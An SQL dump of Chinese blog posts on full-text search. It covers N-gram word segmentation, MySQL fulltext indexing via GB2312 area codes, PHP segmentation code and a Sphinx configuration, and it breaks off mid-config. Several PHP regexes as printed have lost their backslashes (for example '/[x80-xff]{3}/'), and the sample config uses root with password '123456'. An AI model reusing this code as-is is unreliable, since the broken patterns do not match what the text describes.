(28, 28, '&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;全文检索概述：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;全文搜索是指计算机索引程序通过扫描文章中的每一个词，对每一个词建立一个索引，指明该词在文章中出现的次数和位置，当用户查询时，检索程序就根据事先建立的索引进行查找，并将查找的结果反馈给用户的检索方式。对于Google、百度都是比较典型的全文搜索引擎系统。&lt;span style=&quot;color:#339999&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;百度百科：全文检索是将存储于数据库中整本书、整篇文章中的任意内容信息查找出来的检索。它可以根据需要获得全文中有关章、节、段、句、词等信息，也可以进行各种统计和分析。例如，它可以回答&ldquo;《红楼梦》一书中&ldquo;林黛玉&rdquo;一共出现多少次？&rdquo;的问题。&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;检索基本过程：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;全文检索大体分两个过程，索引创建(Indexing)和搜索索引(Search)。&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color:#339999&quot;&gt;&bull; 索引创建：&lt;/span&gt;将需要被搜索的数据提取信息，创建索引的过程。&lt;br /&gt;&lt;span style=&quot;color:#339999&quot;&gt;&bull; 搜索索引：&lt;/span&gt;就是得到用户的查询请求，搜索创建的索引，然后返回结果的过程。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#339999&quot;&gt;全文检索的索引创建过程一般有以下几步：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#339999&quot;&gt;1：准备待索引的原数据&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#339999&quot;&gt;2：将原数据传给分词组件。&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;分词组件会做以下几件事情：&lt;br /&gt;1. 将文档分成一个一个单独的单词。&lt;br /&gt;2. 去除标点符号。&lt;br /&gt;3. 去除停词(Stop word)。&lt;/p&gt;&lt;p&gt;经过分词(Tokenizer)后得到的结果称为词元(Token)。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;strong&gt;3：将得到的词元(Token)传给语言处理组件(Linguistic Processor)。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;对于英语，语言处理组件一般做以下几点：&lt;br /&gt;1. 变为小写(Lowercase)。&lt;br /&gt;2. 将单词缩减为词根形式，如&ldquo;cars&rdquo;到&ldquo;car&rdquo;等。这种操作称为：stemming。&lt;br /&gt;3. 将单词转变为词根形式，如&ldquo;drove&rdquo;到&ldquo;drive&rdquo;等。这种操作称为：lemmatization。&lt;/p&gt;&lt;p&gt;语言处理组件的结果称为词(Term)。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;strong&gt;4：将得到的词(Term)传给索引组件(Indexer)。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;索引组件(Indexer)主要做以下几件事情：&lt;br /&gt;1. 利用得到的词(Term)创建一个字典。&lt;/p&gt;&lt;p&gt;2. 对字典按字母顺序进行排序。&lt;/p&gt;&lt;p&gt;3. 合并相同的词(Term)成为文档倒排(Posting List)链表。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;简单的中文分词算法：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;简单的中文分词算法知识，一般采用N元分词法对中文词句进行拆分。基本过程是，对于中文文档，首先过滤标点符号，将其替换成空格，然后对空格之间的每一段词句依次拆分，每个词元为N个字，然后合并相同的词元，并对词元进行排序。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;strong&gt;一元分词法：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;例句：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;上有天堂，下有苏杭！&lt;/span&gt;&lt;/p&gt;&lt;p&gt;根据上面的过程，首先我们将标点符号替换为空格，则句子转化为：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;上有天堂 下有苏杭&lt;/span&gt;&lt;/p&gt;&lt;p&gt;然后对于一元分词，一个字就是一个词元，句子拆分为：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;上 有 天 堂 下 有 苏 杭 &amp;nbsp;&lt;/span&gt;&lt;br /&gt;最后合并相同的词元，得到结果如下：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;上 有 天 堂 下 苏 杭 &amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;strong&gt;二元分词法：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;同样的对于上面的句子，第一步是相同的，对于二元分词，两个字作为一个词元，依次拆分为：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;上有 有天 天堂 下有 有苏 苏杭 &lt;/span&gt; &lt;br /&gt;最后合并相同词元，得到分词结果：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;上有 有天 天堂 下有 有苏 苏杭 &lt;/span&gt; &lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;搜索结果排序：&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;按照匹配相似度排序，相似度最高的排在最前面，以此降序排列。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px;color:#006600&quot;&gt;&lt;strong&gt;Mysql全文检索过程介绍：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Mysql从4.0版本开始支持全文检索，但是只是对英文支持全文索引。对于中文全文检索，首先我们需要将中文转变为mysql眼中的英文，然后它才能以英文分词算法去对句子进行正确的分词处理，以便建立起全文索引。&lt;/p&gt;&lt;p&gt;例如对于上面的结果：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;上有 有天 天堂 下有 有苏 苏杭&lt;/span&gt;&lt;/p&gt;&lt;p&gt;这样的分词结果已经符合mysql眼中的&ldquo;英文&rdquo;书写格式，但是mysql中的ft_min_word_len这个参数的默认值为4，也就是4个字母以上长度的单词，才会被考虑，小于4个的，将会被忽略。我们需要修改这个长度，这样才能搜索到像天堂、苏杭等这样的短词语，比如将其设置成2，但是这样做有一个缺点，它也会检索到一些像PHP,HP等过于短小的英文词语，从而出现很多无意义的搜索结果。&lt;/p&gt;&lt;p&gt;还有另外一种方法来避开这个问题，那就是把中文转变为另外一种语言，比如MD5，分词结果转变为：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;上有 有天 天堂 下有 有苏 苏杭 =&amp;gt; 4ab801a555e6ff20e33cdd4e585c474e 8c59fda62e9e91995c40561ae6da83ad e69ee86290f7dd5d96c93546dfa5f83e  \r\n985462310c8c259f4dfddda070a5181d 7937ff7349ba8c433c3eb088c853c6f6 16c6a7b45e0b49bbb9be1a820316715b&lt;/pre&gt;&lt;p&gt;这样表示汉字词元，既使每个词元长度大于ft_min_word_len的默认长度2，同时又缩短了长度，不至于占用很大的存储空间，我们可以将分词结果存储于索引表中以备查询之用。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;具体例子：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;表结构：article&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;title &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;varchar 200 -------- 用于存放标题 (显示用)&lt;br /&gt;search &amp;nbsp; text &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;span style=&quot;color:#339999&quot;&gt;--------&lt;/span&gt; 用于存放标题分词结果 (检索用)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;为字段search建立fulltext 索引&lt;/span&gt;&lt;/p&gt;&lt;p&gt;首先我们在将标题保存到数据库的时候，就已经将标题分词并转为区位码，保存到search字段中，以用于全文索引。&lt;/p&gt;&lt;p&gt;我们搜索标题：&ldquo;&lt;span style=&quot;color:#339999&quot;&gt;苏杭 &amp;nbsp;人间的天堂&lt;/span&gt;&rdquo;&lt;/p&gt;&lt;p&gt;经过分词转区位码操作，结果为：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#7030A0;&quot;&gt;苏杭 &amp;nbsp;人间的天堂 =&amp;gt; 43532628 40432868 28682136 21364476 44764435 &amp;nbsp;&lt;/span&gt;&lt;br /&gt;然后进行全文检索查询：&lt;/p&gt;&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;SELECT title, MATCH(search) AGAINST(&#039;43532628 40432868 28682136 21364476 44764435&#039; IN BOOLEAN MODE)  \r\nAS score FROM la_search  \r\nWHERE MATCH(search) AGAINST(&#039;43532628 40432868 28682136 21364476 44764435&#039; IN BOOLEAN MODE)  \r\nORDER BY score DESC \r\nLIMIT 0,5&lt;/pre&gt;&lt;p&gt;这里将score作为相似度，按照相似度进行降序排列，相似度最高的显示在最前面。&lt;/p&gt;&lt;p&gt;最后在实际使用中，我们需要提取score大于1的数据，并且结果会将标题也计入结果集中，需要将其过滤输出。&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;中文二元分词方法及区位码转换代码：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7298300&quot;&gt;http://blog.csdn.net/luochuan/article/details/7298300&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考资料：&lt;/p&gt;&lt;p&gt;区位码百度百科：&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/685605.htm&quot;&gt;http://baike.baidu.com/view/685605.htm&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;区位码查询：&lt;a target=&quot;_blank&quot; href=&quot;http://quwei.911cha.com/&quot;&gt;http://quwei.911cha.com/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Mysql全文检索介绍：&lt;a target=&quot;_blank&quot; href=&quot;http://www.21andy.com/blog/20080123/779.html&quot;&gt;http://www.21andy.com/blog/20080123/779.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386771956),
(29, 29, '&lt;p&gt;简单的中文分词算法，二元分词的PHP代码：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$str = &#039;苏杭，人间的天堂paradise！&#039;; \r\n//$str = iconv(&#039;GB2312&#039;,&#039;UTF-8&#039;,$str); \r\n$result = spStr($str); \r\nprint_r($result); \r\n                                        \r\n/**\r\n * UTF-8版 中文二元分词\r\n */ \r\nfunction spStr($str) \r\n{ \r\n    $cstr = array(); \r\n                                        \r\n    $search = array(&quot;,&quot;, &quot;/&quot;, &quot;\\&quot;, &quot;.&quot;, &quot;;&quot;, &quot;:&quot;, &quot;&quot;&quot;, &quot;!&quot;, &quot;~&quot;, &quot;`&quot;, &quot;^&quot;, &quot;(&quot;, &quot;)&quot;, &quot;?&quot;, &quot;-&quot;, &quot;	&quot;, &quot;\n&quot;, &quot;&#039;&quot;, &quot;&amp;lt;&quot;, &quot;&amp;gt;&quot;, &quot;\r&quot;, &quot;\r\n&quot;, &quot;{1}quot;&quot;, &quot;&amp;amp;&quot;, &quot;%&quot;, &quot;#&quot;, &quot;@&quot;, &quot;+&quot;, &quot;=&quot;, &quot;{&quot;, &quot;}&quot;, &quot;[&quot;, &quot;]&quot;, &quot;：&quot;, &quot;）&quot;, &quot;（&quot;, &quot;．&quot;, &quot;。&quot;, &quot;，&quot;, &quot;！&quot;, &quot;；&quot;, &quot;&ldquo;&quot;, &quot;&rdquo;&quot;, &quot;&lsquo;&quot;, &quot;&rsquo;&quot;, &quot;［&quot;, &quot;］&quot;, &quot;、&quot;, &quot;&mdash;&quot;, &quot;　&quot;, &quot;《&quot;, &quot;》&quot;, &quot;－&quot;, &quot;&hellip;&quot;, &quot;【&quot;, &quot;】&quot;,); \r\n                                        \r\n    $str = str_replace($search, &quot; &quot;, $str); \r\n    preg_match_all(&quot;/[a-zA-Z]+/&quot;, $str, $estr); \r\n    preg_match_all(&quot;/[0-9]+/&quot;, $str, $nstr); \r\n                                        \r\n    $str = preg_replace(&quot;/[0-9a-zA-Z]+/&quot;, &quot; &quot;, $str); \r\n    $str = preg_replace(&quot;/s{2,}/&quot;, &quot; &quot;, $str); \r\n                                        \r\n    $str = explode(&quot; &quot;, trim($str)); \r\n                                        \r\n    foreach ($str as $s) { \r\n        $l = strlen($s); \r\n                                        \r\n        $bf = null; \r\n        for ($i= 0; $i&amp;lt; $l; $i=$i+3) { \r\n            $ns1 = $s{$i}.$s{$i+1}.$s{$i+2}; \r\n            if (isset($s{$i+3})) { \r\n                $ns2 = $s{$i+3}.$s{$i+4}.$s{$i+5}; \r\n                if (preg_match(&quot;/[x80-xff]{3}/&quot;,$ns2)) $cstr[] = $ns1.$ns2; \r\n            } else if ($i == 0) { \r\n                $cstr[] = $ns1; \r\n            } \r\n        } \r\n    } \r\n                                        \r\n    $estr = isset($estr[0])?$estr[0]:array(); \r\n    $nstr = isset($nstr[0])?$nstr[0]:array(); \r\n                                        \r\n    return array_merge($nstr,$estr,$cstr); \r\n}&lt;/pre&gt;&lt;p&gt;&amp;quot;苏杭，人间的天堂paradise&ldquo;经过二元分词之后，转变为：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;Array (\r\n    [0] =&amp;gt; paradise\r\n    [1] =&amp;gt; 苏杭\r\n    [2] =&amp;gt; 人间\r\n    [3] =&amp;gt; 间的\r\n    [4] =&amp;gt; 的天\r\n    [5] =&amp;gt; 天堂\r\n)&lt;/pre&gt;&lt;p&gt;接下来，是将以上结果转换为单字节的，可以用md5,base64,sha1等，但是用这些转换后的字符都太长，占用太多的存储空间，我们可以用区位码来表示汉字，汉字转区位码的PHP代码：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;foreach ($result as $s) { \r\n    $s = iconv(&#039;UTF-8&#039;,&#039;GB2312&#039;,$s); \r\n    $code[] = gbCode($s); \r\n} \r\n$code = implode(&quot; &quot;, $code); \r\necho $code; \r\n           \r\nfunction gbCode($str) { \r\n    $return = null; \r\n           \r\n    if (!preg_match(&quot;/^[x80-xff]{2,}$/&quot;,$str)) return $str; \r\n           \r\n    $len = strlen($str); \r\n    for ($i= 0; $i&amp;lt; $len; $i=$i+2) { \r\n        $return .= sprintf(&quot;%02d%02d&quot;,ord($str{$i})-160,ord($str{$i+1})-160); \r\n    } \r\n           \r\n    return $return; \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;转换后的结果为：&lt;/p&gt;&lt;p&gt;paradise 43532628 40432868 28682136 21364476 44764435&lt;/p&gt;最后将得到的结果入库，插入全文索引表，结果应该插入索引表的fulltext索引字段。&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386772283),
(30, 30, '&lt;p&gt;&lt;span class=&quot;search_hit&quot;&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;Sphinx概述：&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;search_hit&quot;&gt;Sphinx&lt;/span&gt;是一个基于SQL的全文检索引擎，可以结合MySQL,PostgreSQL做全文搜索，它可以提供比数据库本身更专业的搜索功能，使得应用程序更容易实现专业化的全文检索。&lt;span class=&quot;search_hit&quot;&gt;Sphinx&lt;/span&gt;特别为一些脚本语言设计搜索API接口，如PHP,Python,&lt;acronym title=&quot;Practical Extraction and Report Language&quot;&gt;Perl&lt;/acronym&gt;,Ruby等，同时为MySQL也设计了一个存储引擎插件。&lt;/p&gt;&lt;p&gt;Sphinx 单一索引最大可包含1亿条记录，在1千万条记录情况下的查询速度为0.x秒（毫秒级）。Sphinx创建索引的速度为：创建100万条记录的索引只需 3～4分钟，创建1000万条记录的索引可以在50分钟内完成，而只包含最新10万条记录的增量索引，重建一次只需几十秒。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span class=&quot;search_hit&quot;&gt;Sphinx&lt;/span&gt;的主要特性包括：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin-left:20px;&quot;&gt;高速索引 (在新款CPU上,近10 MB/秒);&lt;br /&gt;高速搜索 (2-4G的文本量中平均查询速度不到0.1秒);&lt;br /&gt;高可用性 (单CPU上最大可支持100 GB的文本,100M文档);&lt;br /&gt;提供良好的相关性排名&lt;br /&gt;支持分布式搜索;&lt;br /&gt;提供文档摘要生成;&lt;br /&gt;提供从MySQL内部的插件式存储引擎上搜索&lt;br /&gt;支持布尔,短语, 和近义词查询;&lt;br /&gt;支持每个文档多个全文检索域(默认最大32个);&lt;br /&gt;支持每个文档多属性;&lt;br /&gt;支持断词;&lt;br /&gt;支持单字节编码与UTF-8编码;&lt;/p&gt;&lt;p style=&quot;margin-left:20px;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;安装sphinx&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;下载sphinx-2.0.3：&lt;/span&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://sphinxsearch.com/downloads/accept.php?file=sphinx-2.0.3-release.tar.gz&quot;&gt;http://sphinxsearch.com/downloads/accept.php?file=sphinx-2.0.3-release.tar.gz&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;color:#339999&quot;&gt;安装：&lt;/p&gt;&lt;p style=&quot;color:#339999&quot;&gt;./configure&lt;/p&gt;&lt;p style=&quot;color:#339999&quot;&gt;sudo make install&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;建立测试数据库&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;测试数据库可以将sphinx自带的example.sql导入到mysql自带的test数据库，也可以用我们自己的，我选择用自己的一个库laugh，这个库有一个表是我自己建的全文检索表，这样可以不需要自己重新构造数据。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;配置sphinx&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;安装成功之后，sphinx的模板配置文件被放到了在/usr/local/etc目录下，为了方便管理，我在/usr/local下新建sphinx文件夹以存储日志、索引文件等&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;mkdir /usr/local/sphinx \r\nmkdir /usr/local/sphinx/data \r\nmkdir /usr/local/sphinx/log \r\ncp /usr/local/etc/sphinx-min.conf.in /usr/local/sphinx/sphinx-min.conf.in \r\nmv /usr/local/sphinx/sphinx-min.conf.in /usr/local/sphinx/sphinx.conf \r\nmacvim /usr/local/sphinx/sphinx.conf&lt;/pre&gt;&lt;p&gt;sphinx.conf的内容组成格式为：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;source 源名称1{ \r\n &hellip; \r\n} \r\nindex 索引名称1{ \r\n source=源名称1 \r\n &hellip; \r\n} \r\nsource 源名称2{ \r\n &hellip; \r\n} \r\nindex 索引名称2{ \r\n source = 源名称2 \r\n &hellip; \r\n} \r\nindexer{ \r\n &hellip; \r\n} \r\nsearchd{ \r\n &hellip; \r\n}&lt;/pre&gt;&lt;p&gt;sphinx可以同时为多个数据源建立索引，不同的数据源的索引可以为不同的应用提供全文检索服务。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;sphinx.conf相关配置项说明：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;Source部分&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;#type &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 数据库类型，目前支持mysql与pgsql&lt;br /&gt;#strip_html &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;是否去掉html标签&lt;br /&gt;#sql_host &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 数据库主机地址&lt;br /&gt;#sql_user &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;数据库用户名&lt;br /&gt;#sql_pass &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 数据库密码&lt;br /&gt;#sql_db &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;数据库名称&lt;br /&gt;#sql_port &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;数据库采用的端口&lt;br /&gt;#sql_query_pre &amp;nbsp; &amp;nbsp; &amp;nbsp;执行sql前要设置的字符集，用utf8必须SET NAMES utf8&lt;br /&gt;#sql_query &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 全文检索要显示的内容，在这里尽可能不使用where或group by，将where与groupby的内容交给sphinx，由sphinx进行条件过滤与groupby效率会更高&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：&lt;/span&gt;select 出来的字段必须至少包括一个唯一主键(ARTICLESID)以及要全文检索的字段，你计划原本在where中要用到的字段也要select出来，这里不需要使用orderby&lt;br /&gt;#sql_attr_ 开头的表示一些属性字段，你原计划要用在where,orderby,groupby中的字段要在这里定义&lt;br /&gt;#根据我们原先的SQL:&lt;br /&gt;#SELECT id,title,link,sindex FROM la_article_index WHERE title LIKE ? ORDER BY id DESC&lt;br /&gt;#我们需要对title, id进行属性定义(这两个字段也要在SELECT的字段列表中)，定义时不同的字段类型有不同的属性名称，具体可以见sphinx.conf.in中的说明&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color:#339999&quot;&gt;index部分&lt;/span&gt;&lt;br /&gt;#source &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;数据源名&lt;br /&gt;#path &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 索引记录存放目录，如/usr/local/sphinx/data/laugh,实际存放时会存放在/usr/local/sphinx/data目录，然后创建多个laugh名称，不同扩展名的索引文件。&lt;br /&gt;#其他的配置如min_word_len,charset_type,charset_table,ngrams_chars,ngram_len这些则是支持中文检索需要设置的内容。&lt;br /&gt;#如果检索的不是中文，则charset_table,ngrams_chars,min_word_len就要设置不同的内容，具体官方网站的论坛中有很多，大家可以去搜索看看。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;关于配置文件的详细说明信息，请阅读/usr/local/etc/sphinx.conf.in&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;根据上面的配置项说明，我的sphinx.conf配置内容如下：&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;# \r\n# Minimal Sphinx configuration sample (clean, simple, functional) \r\n# \r\n                                             \r\nsource mysql \r\n{ \r\n    type            = mysql \r\n                                             \r\n    sql_host        = localhost \r\n    sql_user        = root \r\n    sql_pass        = 123456 \r\n    sql_db          = laugh \r\n    sql_port        = 3306  # optional, default is 3306 \r\n                                             \r\n    sql_query_pre   = SET NAMES utf8 \r\n    sql_query       = SELECT id, article_id, title, link FROM la_article_index \r\n                                             \r\n    sql_attr_uint   = article_id \r\n} \r\n                                             \r\n                                             \r\nindex laugh \r\n{ \r\n    source          = mysql \r\n    path            = /usr/local/sphinx/data/laugh \r\n    docinfo         = extern \r\n                                             \r\n    min_word_len  = 1 \r\n    charset_type  = utf-8 \r\n    charset_table = U+FF10..U+FF19-&amp;gt;0..9, 0..9, U+FF41..U+FF5A-&amp;gt;a..z, U+FF21..U+FF3A-&amp;gt;a..z, \r\nA..Z-&amp;gt;a..z, a..z, U+0149, U+017F, U+0138, U+00DF, U+00FF, U+00C0..U+00D6-&amp;gt;U+00E0..U+00F6, \r\nU+00E0..U+00F6, U+00D8..U+00DE-&amp;gt;U+00F8..U+00FE, U+00F8..U+00FE, U+0100-&amp;gt;U+0101, U+0101, \r\nU+0102-&amp;gt;U+0103, U+0103, U+0104-&amp;gt;U+0105, U+0105, U+0106-&amp;gt;U+0107, U+0107, U+0108-&amp;gt;U+0109, \r\nU+0109, U+010A-&amp;gt;U+010B, U+010B, U+010C-&amp;gt;U+010D, U+010D, U+010E-&amp;gt;U+010F, U+010F, \r\nU+0110-&amp;gt;U+0111, U+0111, U+0112-&amp;gt;U+0113, U+0113, U+0114-&amp;gt;U+0115, U+0115,  \r\nU+0116-&amp;gt;U+0117,U+0117, U+0118-&amp;gt;U+0119, U+0119, U+011A-&amp;gt;U+011B, U+011B, U+011C-&amp;gt;U+011D, \r\n U+011D,U+011E-&amp;gt;U+011F, U+011F, U+0130-&amp;gt;U+0131, U+0131, U+0132-&amp;gt;U+0133, U+0133,  \r\nU+0134-&amp;gt;U+0135,U+0135, U+0136-&amp;gt;U+0137, U+0137, U+0139-&amp;gt;U+013A, U+013A, U+013B-&amp;gt;U+013C,  \r\nU+013C,U+013D-&amp;gt;U+013E, U+013E, U+013F-&amp;gt;U+0140, U+0140, U+0141-&amp;gt;U+0142, U+0142,  \r\nU+0143-&amp;gt;U+0144,U+0144, U+0145-&amp;gt;U+0146, U+0146, U+0147-&amp;gt;U+0148, U+0148, U+014A-&amp;gt;U+014B,  \r\nU+014B,U+014C-&amp;gt;U+014D, U+014D, U+014E-&amp;gt;U+014F, U+014F, U+0150-&amp;gt;U+0151, U+0151,  \r\nU+0152-&amp;gt;U+0153,U+0153, U+0154-&amp;gt;U+0155, U+0155, U+0156-&amp;gt;U+0157, U+0157, U+0158-&amp;gt;U+0159, \r\n U+0159,U+015A-&amp;gt;U+015B, U+015B, U+015C-&amp;gt;U+015D, U+015D, U+015E-&amp;gt;U+015F, U+015F,  \r\nU+0160-&amp;gt;U+0161,U+0161, U+0162-&amp;gt;U+0163, U+0163, U+0164-&amp;gt;U+0165, U+0165, U+0166-&amp;gt;U+0167,  \r\nU+0167,U+0168-&amp;gt;U+0169, U+0169, U+016A-&amp;gt;U+016B, U+016B, U+016C-&amp;gt;U+016D, U+016D,  \r\nU+016E-&amp;gt;U+016F,U+016F, U+0170-&amp;gt;U+0171, U+0171, U+0172-&amp;gt;U+0173, U+0173, U+0174-&amp;gt;U+0175, \r\n U+0175,U+0176-&amp;gt;U+0177, U+0177, U+0178-&amp;gt;U+00FF, U+00FF, U+0179-&amp;gt;U+017A, U+017A,  \r\nU+017B-&amp;gt;U+017C,U+017C, U+017D-&amp;gt;U+017E, U+017E, U+0410..U+042F-&amp;gt;U+0430..U+044F,  \r\nU+0430..U+044F,U+05D0..U+05EA, U+0531..U+0556-&amp;gt;U+0561..U+0586, U+0561..U+0587,  